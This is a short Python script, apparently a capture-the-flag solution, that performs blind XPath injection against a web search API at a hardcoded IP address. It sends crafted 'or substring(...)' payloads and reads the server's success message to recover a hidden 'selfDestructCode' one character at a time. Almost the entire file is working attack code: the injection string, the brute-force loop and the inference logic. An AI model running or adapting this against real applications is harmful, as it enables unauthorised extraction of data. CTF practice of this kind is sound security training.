import json
import requests

final = ""

for x in range(len(final)+1, 100):
    for c in range(0x20, 0x80): # for every x position, try the character y (0x20 - 0x7e are the "characters" in the ASCII table)
        if c == 0x7f:
            print("done!")
            __import__("sys").exit()
        c = chr(c)

        # the flag was split into 2 locations, so i ran the script twice
        # injection = f"' or substring((//military/district[position()=2]/staff[position()=3]/selfDestructCode),{x},1)='{c}" # part 1
        injection = f"' or substring((//military/district[position()=3]/staff[position()=2]/selfDestructCode),{x},1)='{c}" # part 2
        res = requests.post("http://178.62.14.240:30683/api/search", json={"search": injection}).text
        try:
            j = json.loads(res)
        except:
            continue
        if j["message"] == "This millitary staff member exists.": # if we get a success, we know that the character we just sent in is correct for the position
            final += c
            print(final)
            break